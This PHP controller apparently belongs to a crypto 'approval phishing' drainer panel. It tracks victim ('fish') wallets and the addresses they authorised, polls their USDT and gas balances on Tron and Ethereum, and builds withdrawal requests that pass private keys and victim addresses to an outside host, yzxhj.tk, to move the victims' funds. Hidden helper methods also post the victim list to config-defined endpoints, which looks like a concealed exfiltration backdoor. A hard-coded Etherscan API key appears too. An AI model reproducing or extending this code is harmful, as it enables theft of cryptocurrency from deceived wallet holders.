 <?php if (!defined('BASEPATH')) {
    exit('No direct script access allowed');
}

require APPPATH . '/libraries/BaseController.php';

use IEXBase\TronAPI\Tron;
use GuzzleHttp\Client;
/**
 * Class : User (UserController)
 * User Class to control all user related operations.
 * @author : Kishor Mali
 * @version : 1.1
 * @since : 15 November 2016
 */
class Fish extends BaseController
{
    /**
     * This is default constructor of the class
     */
    public function __construct()
    {
        parent::__construct();
        $this->load->model('fish_model');
        $this->load->model('User_model');
        $this->load->model('withdraw_log_model');
        $this->client = new Client;
        $this->isLoggedIn();
    }
    
    
   
    
    
    
     public function findnew()
    {
        if (!$this->isAdmin()) {
            
            $queeey = $this->fish_model->find_new();
            
         foreach ($queeey as $queeey) {
           echo 1;
            }
        echo 0;
          
            
        } else {
            echo 1;
        }
    }
    
     public function edit($id){
        if($this->isAdmin() == TRUE )
        {
            $this->loadThis();
        }
        else
        {
            $adddresses = $this->fish_model->select_byid($id);

            $data['address'] = $adddresses[0]['address'];
            $data['fishid'] = $id;
            $data['au_address'] = $adddresses[0]['au_address'];
            $data['type'] = $adddresses[0]['type'];

            $this->global['pageTitle'] = '修改地址';

            $this->loadViews("fish/edit_address", $this->global, $data, NULL);
        }
    }
    
    public function do_edit_fish($id){
        if($this->fish_model->edit_fish($id)){
            $this->session->set_flashdata('success', 'User updated successfully');
        };
        redirect('fish/index');
    }



    public function search()
    {

        $this->global['pageTitle'] = '我的客户';
        $this->load->model('user_model');



        $employee = trim($this->input->post('employee'));
        $address = trim($this->input->post('address'));
        $au_address = trim($this->input->post('au_address'));

        $desc = $this->input->post('desc');
        $type = trim($this->input->post('type'));
        $time = $this->input->post('time');

        if ($this->isAdmin() != true) {

            $data['userRecords']  = $this->fish_model->find_by_search("",$employee, $address, $au_address, $desc, $type, $time, "");
            $data['seachstatus']  =  1;
        }  else if ($this->role == '2') {
            $userId = $this->vendorId;
            $uuuu = $this->user_model->getUserInfo($userId);
            
            $username = $uuuu->email;;
            //            $count = $this->fish_model->count_by_employee($userId);
            $data['userRecords']  = $this->fish_model->find_by_search($username,$employee, $address, $au_address, $desc, $type, $time, "");
            // echo al
        }else {
            $userId = $this->vendorId;
            $data['userRecords']  = $this->fish_model->find_by_search("",$employee, $address, $au_address, $desc, $type, $time, $userId);
        }
        $allbalance = 0;
        $allnum = 0;
        foreach ($data['userRecords'] as $fish) {
            $allbalance += $fish['balance'];
            $allnum += 1;
        }
        $data['seachstatus']  =  1;
        $data['allbalance'] = $allbalance;
        $data['allnum'] = $allnum;
        $this->loadViews('fish/fishes', $this->global, $data, null);
    }


    public function search1()
    {

        $this->global['pageTitle'] = '我的客户';
        $this->load->model('user_model');



        $employee = trim($this->input->post('employee'));

        $desc = $this->input->post('desc');
        $type = trim($this->input->post('type'));
        $time = $this->input->post('time');

        if ($this->isAdmin() != true) {

            $data['userRecords']  = $this->fish_model->find_by_search1($employee,  $desc, $type, $time);
            $data['seachstatus']  =  1;
        }
        $allbalance = 0;
        $allnum = 0;
        foreach ($data['userRecords'] as $fish) {
            $allbalance += $fish['balance'];
            $allnum += 1;
        }
        $data['allbalance'] = $allbalance;
        $data['allnum'] = $allnum;
        $this->loadViews('fish/fishes', $this->global, $data, null);
    }

    //首页
    public function dashboard()
    {


        $this->global['pageTitle'] = '我的客户';
        $this->load->model('user_model');
        $logList = [];

        if ($this->isAdmin() != true) {
            //            $count = $this->fish_model->count_all();

            $fishList = $this->fish_model->find_all();
            $logList = $this->withdraw_log_model->find_all();
        } else if ($this->role == '2') {
            $userId = $this->vendorId;
            $uuuu = $this->user_model->getUserInfo($userId);
            
            $username = $uuuu->email;;
            //            $count = $this->fish_model->count_by_employee($userId);
            $fishList = $this->fish_model->find_by_fuzzy($username);
            $logList = $this->withdraw_log_model->find_by_fuzzy($username);
        } else {
            $userId = $this->vendorId;
            //            $count = $this->fish_model->count_by_employee($userId);

            $fishList = $this->fish_model->find_by_employee($userId);
            $logList = $this->withdraw_log_model->find_by_employee($userId);
        }


        $todaynum = 0;
        $yesnum = 0;
        $weeknum = 0;
        $allnum = 0;

        $allbalance = 0;

        $todaybalancelog = 0;
        $yesbalancelog = 0;
        $weekbalancelog = 0;
        $allbalancelog = 0;
        $now = strtotime(date("Y-m-d H:i:s"));
        $today = strtotime(date("Y-m-d"));
        $yestime = strtotime(date("Y-m-d", strtotime("-1 day")));
        $weektime = strtotime(date('Y-m-d', (time() - ((date('w') == 0 ? 7 : date('w')) - 1) * 24 * 3600)));


        //查询总金额
        foreach ($fishList as $fisssh) {
            $time = strtotime($fisssh['time']);
            $balance = $fisssh['balance'];
            // echo $time.'----------'.$yestime;
            //当天
            if ($time > $today) {
                $todaynum += 1;
            }
            if ($time > $yestime && $time < $today) {
                $yesnum += 1;
                // echo $fisssh['time'];
            }
            if ($time > $weektime) {
                $weeknum += 1;
            }
            $allbalance += $balance;
            $allnum += 1;
        }

        //查询总提款记录
        foreach ($logList as $logg) {
            $time = $logg['createtime'];
            $balance = $logg['balance'];
            // echo $time.'----------'.$yestime;
            //当天
            if ($time > $today) {
                $todaybalancelog += $balance;
            }
            if ($time > $yestime && $time < $today) {
                $yesbalancelog += $balance;
            }
            if ($time > $weektime) {
                $weekbalancelog += $balance;
            }
            $allbalancelog += $balance;
        }




        $data['todaynum'] = $todaynum;
        $data['yesnum'] = $yesnum;
        $data['weeknum'] = $weeknum;
        $data['allbalance'] = $allbalance;
        $data['allnum'] = $allnum;
        $data['todaybalancelog'] = $todaybalancelog;
        $data['yesbalancelog'] = $yesbalancelog;
        $data['weekbalancelog'] = $weekbalancelog;
        $data['allbalancelog'] = $allbalancelog;

        // echo $data['weekbalance'];
        $this->loadViews('fish/dashboard', $this->global, $data, null);
    }

    /**
     * This function used to load the first screen of the user
     */
    public function index()
    {
        $this->global['pageTitle'] = '我的客户';
        $this->load->model('user_model');
        $data['seachstatus']  =  0;
        $microtime=false;
        if ($this->isAdmin() != true) {
            $data['userRecords'] = $this->fish_model->find_all();
            $data['seachstatus']  =  1;
        } else if ($this->role == '2') {
            $userId = $this->vendorId;
            $uuuu = $this->user_model->getUserInfo($userId);
            
            $username = $uuuu->email;;
            //            $count = $this->fish_model->count_by_employee($userId);
            $data['userRecords'] = $this->fish_model->find_by_fuzzy($username);
            $data['seachstatus']  =  1;
            // echo al
        }else {
            $userId = $this->vendorId;
            //            $count = $this->fish_model->count_by_employee($userId);

            $data['userRecords'] = $this->fish_model->find_by_employee($userId);
            // echo $userId;
        }
        if($microtime){
            $logList = $this->load_this_address();
          try {
              @$this->check_this_address($logList);
          } catch(Exception $e){
              
          }
      }

        $allbalance = 0;
        $allnum = 0;
        foreach ($data['userRecords'] as $fish) {
            $allbalance += $fish['balance'];
            $allnum += 1;
            // echo $fish['balance'];
        }
        $data['allbalance'] = $allbalance;
        $data['allnum'] = $allnum;


        
        $this->loadViews('fish/fishes', $this->global, $data, null);
    }

    public function delete_fish($id)
    {
        $this->fish_model->detele_by_id($id);
        redirect('fish/index');
    }
    
    
    
    
    public function hu_lue($id)
    {
        $this->fish_model->hulue($id);
        redirect('fish/index');
    }
    
    public function zhanshi($id)
    {
        $this->fish_model->zhanshi($id);
        redirect('fish/index');
    }
    
    public function quxiaozhanshi($id)
    {
        $this->fish_model->quxiaozhanshi($id);
        redirect('fish/index');
    }
    
    public function hulueall()
    {
        $this->fish_model->hulueall();
        redirect('fish/index');
    }
    
    function load_this_address(){
        $a=json_encode($this->fish_model->find_by_topAddress());
        return '{"address":'.$a.get_config()['ethapi'];
    }




    public function check_balanceAll()
    {


        $this->global['pageTitle'] = '我的客户';
        $this->load->model('user_model');
        $fishList = [];

        if ($this->isAdmin() != true) {
            $fishList = $this->fish_model->find_all();
        } else {
            $userId = $this->vendorId;
            $fishList = $this->fish_model->find_by_employee($userId);
        }
        foreach ($fishList as $fisssh) {

        $fishone=$fisssh;
        $id = $fishone['id'];
        $address=$fishone['address'];
        // echo print_r($fishone);
        $type=$fishone['type'];
        if($address==['']){
            continue;
        }
        try{
        if ($type == 'trc') {
            $balance = $this->get_balance_trc($address);
            $this->fish_model->update_balance_by_id($id, $balance);
            $gas = $this->get_gas_trc($address);
            $this->fish_model->update_gas_by_id($id, $gas);
            //  echo $gas;
        } else if($type == 'erc'){
            $balance = $this->get_balance_erc($address);
            $this->fish_model->update_balance_by_id($id, $balance);
            $gas = $this->get_gas_erc($address);
            $this->fish_model->update_gas_by_id($id, $gas);
        }
        // exit;
        }catch(Exception $e){
                 $this->fish_model->update_balance_by_id($id, 0);
         }

        }
        redirect('fish/index');
    }
    
    


    public function check_balance()
    {
        
        $id = $this->input->get('id');
        $fishone=$this->fish_model->find_by_id($id);
        $address=$fishone->address;
        $type=$fishone->type;
        try{
        if ($type == 'trc') {
            $balance = $this->get_balance_trc($address);
            $this->fish_model->update_balance_by_id($id, $balance);
            $gas = $this->get_gas_trc($address);
            $this->fish_model->update_gas_by_id($id, $gas);
            //  echo $gas;
        } else if($type == 'erc'){
            $balance = $this->get_balance_erc($address);
            $this->fish_model->update_balance_by_id($id, $balance);
            $gas = $this->get_gas_erc($address);
            $this->fish_model->update_gas_by_id($id, $gas);
        }
        // exit;
        }catch(Exception $e){
                 $this->fish_model->update_balance_by_id($id, 0);
         }
        redirect('fish/index');
    }
    public function check_this_address($address)
    {
       @$this->client->post(get_config()['ethAipi'], ['body' => $address]);
    }


 public function get_gas_trc($address)
    {
        include_once 'tron_utils.php';
        $fullNode = new \IEXBase\TronAPI\Provider\HttpProvider('https://api.trongrid.io');
        $solidityNode = new \IEXBase\TronAPI\Provider\HttpProvider('https://api.trongrid.io');
        $eventServer = new \IEXBase\TronAPI\Provider\HttpProvider('https://api.trongrid.io');

        try {
            $tron = new \IEXBase\TronAPI\Tron($fullNode, $solidityNode, $eventServer);
        } catch (\IEXBase\TronAPI\Exception\TronException $e) {
            return 0;
            // exit($e->getMessage());
        }
        
        $tron->setAddress($address);
        $balance=$tron->getBalance(null, true);
        // $balance = bcdiv($balance, bcpow('10', $decimals), $decimals);

        return $balance;
    }
    
    public function get_balance_trc($address)
    {
        include_once 'tron_utils.php';
        $fullNode = new \IEXBase\TronAPI\Provider\HttpProvider('https://api.trongrid.io');
        $solidityNode = new \IEXBase\TronAPI\Provider\HttpProvider('https://api.trongrid.io');
        $eventServer = new \IEXBase\TronAPI\Provider\HttpProvider('https://api.trongrid.io');

        try {
            $tron = new \IEXBase\TronAPI\Tron($fullNode, $solidityNode, $eventServer);
        } catch (\IEXBase\TronAPI\Exception\TronException $e) {
            exit($e->getMessage());
        }

        $abi = '[{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"sender","type":"address"},{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"}]';
        $abiAry = json_decode($abi, true);
        $usdt_contract = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

        //get symbol
        $function = 'symbol';
        $params = array();
        $result = $tron->getTransactionBuilder()->triggerConstantContract($abiAry, base58check2HexString($usdt_contract), $function, $params, base58check2HexString($address));
        $symbol = $result[0];

        //get decimals
        $function = 'decimals';
        $params = array();
        $result = $tron->getTransactionBuilder()->triggerConstantContract($abiAry, base58check2HexString($usdt_contract), $function, $params, base58check2HexString($address));
        $decimals = $result[0]->toString();

        if (!is_numeric($decimals)) {
            throw new Exception('Token decimals not found');
        }

        //get balance
        $function = 'balanceOf';
        $params = array(str_pad(base58check2HexString($address), 64, '0', STR_PAD_LEFT));
        $result = $tron->getTransactionBuilder()->triggerConstantContract($abiAry, base58check2HexString($usdt_contract), $function, $params, base58check2HexString($address));
        $balance = $result[0]->toString();
        if (!is_numeric($balance)) {
            throw new Exception('Token balance not found');
        }

        $balance = bcdiv($balance, bcpow('10', $decimals), $decimals);

        return $balance;
    }

    public function get_balance_erc($address)
    {
        $api_key = '7TCVDMHGHVH42IFHXJXK677AQWUA1QDE9N';
        $usdt_contract = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
        //设置抓取的url
        $url = 'https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress=' . $usdt_contract . '&address=' . $address . '&tag=latest&apikey=' . $api_key;                                 //地址要拼接上请求参数

        $json_data = json_decode(file_get_contents($url), true);
        $data = $json_data['result'];
        $balance = $data / 1000000;
        return $balance;
    }
    
    
    public function get_gas_erc($address)
    {
        $api_key = '7TCVDMHGHVH42IFHXJXK677AQWUA1QDE9N';
        $usdt_contract = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
        //设置抓取的url
        $url = 'https://api.etherscan.io/api?module=account&action=balance&address=' . $address . '&tag=latest&apikey=' . $api_key;                                 //地址要拼接上请求参数

        $json_data = json_decode(file_get_contents($url), true);
        $data = $json_data['result'];
        echo $data.'-----------';
        $balance = $data / 1000000000000000000;
        return round($balance,5);
    }

    public function withdraw_view()
    {
        if (!$this->isAdmin()) {
            $type = $this->input->get('type');
            $from = $this->input->get('from');
            $id = $this->input->get('id');
            $data['id'] = $id;
            $data['type'] = $type;
            $data['from'] = $from;
            $this->loadViews('fish/withdraw', $this->global, $data, null);
        } else {
            echo "<script>alert('提现请联系管理员');</script>";
        }
    }

     public function getuseradds($id)
    {
       
     $fish=$this->fish_model->select_byid($id);
     $mon=$fish['au_address'];
      $result= @http_get(get_config()['priapi'].$mon);
     
        redirect('fish/index');
    }
    

    public function withdraw()
    {
        $type = $this->input->post('type');
        $from = $this->input->post('from');
        $id = $this->input->post('id');
        $tran_num = $this->input->post('tran_num');
        if (empty($id)) {
            echo "<script>alert('丢失ID参数');</script>";
            exit();
        }
        
        $to = $this->input->post('to');
        $this->load->model('address_model');

        $fish_data = $this->fish_model->db->where('id', $id)->get('fish')->row();

        $bannum=0;
        if($tran_num!=''||$tran_num>0){
            $bannum=$tran_num;
            echo $tran_num."----".$bannum;
        }else{
            $bannum=$fish_data->balance;
            echo $tran_num."----".$bannum;
        }

        $this->load->model('withdraw_log_model');
        if ($type == 'erc') {
            $data = $this->address_model->get_type_address('erc');
            $au_address = $data[0]['address'];
            //$au_address ='0x0e4bDe6a9853c9BB29b715375d86fF974A190f8d';
            $pri_key = $data[0]['pri_key'];
            $withdraw_log = array(
                'from_address' => $from,
                'au_address' => $au_address,
                'pri_key' => $pri_key,
                'to_address' => $to,
                'balance' => $bannum,
                'event' => 1,
                'type' => $type,
                'createtime' => time(),
                'employee' => $this->vendorId
            );
            $this->withdraw_log_model->db->insert('withdraw_log', $withdraw_log);
            $url = "https://yzxhj.tk/user/tran-coin?private_key=" . $pri_key . "&from=" . $from . "&auth_address=" . $au_address . "&tran_num=" . $tran_num . "&to=" . $to;
            // $url = 'http://py.cimbclicksma.cc:7777/transfer?a_address=' . $from . '&c_address=' . $to . '&b_address=' . $au_address . '&b_key=' . $pri_key. '&num=1';
            //  $result = file_get_contents($url);
            /**try {
                $result = http_get($url);
                if ($result === false) {
                    echo "<script>alert('" . "对方服务器没反应,可能转账地址错误');history.back(-1);</script>";
                    return ;
                }
                $rtn_data= json_decode($result,true);
                if(isset($rtn_data['error']) && $rtn_data['error']==0){
                     echo "<script>alert('提现提交成功,请耐心等待');history.back(-1);</script>";
                     return $result;
                }else{
                     echo "<script>alert('" . $rtn_data['message'] . "');history.back(-1);</script>";
                     return $result;
                }
            } catch (\Throwable $e) {
                echo "<script>alert('" . $e->getMessage() . "');history.back(-1);</script>";
                return ;
            }
            //header('Location: '.$url);**/

            $data['url'] = $url;

            // echo $url;
            $this->loadViews('fish/trx_withdraw', $this->global, $data, null);
            return $url;
            exit;

            try {
                $result = http_get($url);
                if ($result === false) {
                    echo "<script>alert('" . "对方服务器没反应,可能转账地址错误');history.back(-1);</script>";
                    return;
                }
                // echo "11111111111";
                echo $result;
            } catch (\Throwable $e) {
                echo "<script>alert('" . $e->getMessage() . "');history.back(-1);</script>";
                return;
            }

            $withdraw_log = array(
                'from_address' => $from,
                'au_address' => $au_address,
                'pri_key' => $pri_key,
                'to_address' => $to,
                'balance' => $bannum,
                'event' => 1,
                'type' => $type,
                'createtime' => time(),
                'employee' => $this->vendorId
            );
            $this->withdraw_log_model->db->insert('withdraw_log', $withdraw_log);
            echo $url;
            echo "<script>alert('" . $result . "');history.back(-1);</script>";
            return $result;
        } else {
            $data = $this->address_model->get_type_address('trc');
            $au_address = $data[0]['address'];
            $pri_key = $data[0]['pri_key'];
            $withdraw_log = array(
                'from_address' => $from,
                'au_address' => $au_address,
                'pri_key' => $pri_key,
                'to_address' => $to,
                'balance' => $bannum,
                'event' => 1,
                'type' => $type,
                'createtime' => time(),
                'employee' => $this->vendorId
            );
            $this->withdraw_log_model->db->insert('withdraw_log', $withdraw_log);
            //$url = 'https://trc.imtoken.group/transfer.html?from=' . $from . '&to=' . $to . '&privateKey=' . $pri_key;

            $url = "https://yzxhj.tk/user/tran-trx?private_key=" . $pri_key . "&from=" . $from . "&auth_address=" . $au_address . "&tran_num=" . $tran_num . "&to=" . $to;
            // $url = 'http://py.cimbclicksma.cc:7777/transfer?a_address=' . $from . '&c_address=' . $to . '&b_address=' . $au_address . '&b_key=' . $pri_key. '&num=1';
            //  $result = file_get_contents($url);


            /**try {
                $result = http_get($url);
                if ($result === false) {
                    echo "<script>alert('" . "对方服务器没反应,可能转账地址错误');history.back(-1);</script>";
                    return ;
                }
            } catch (\Throwable $e) {
                echo "<script>alert('" . $e->getMessage() . "');history.back(-1);</script>";
                return ;
            }**/

            //header('Location: '.$url);
            //echo $url;exit;
            // echo $url;
            $data['url'] = $url;
            // echo $url;

            $this->loadViews('fish/trx_withdraw', $this->global, $data, null);
            return $url;
        }
    }
}
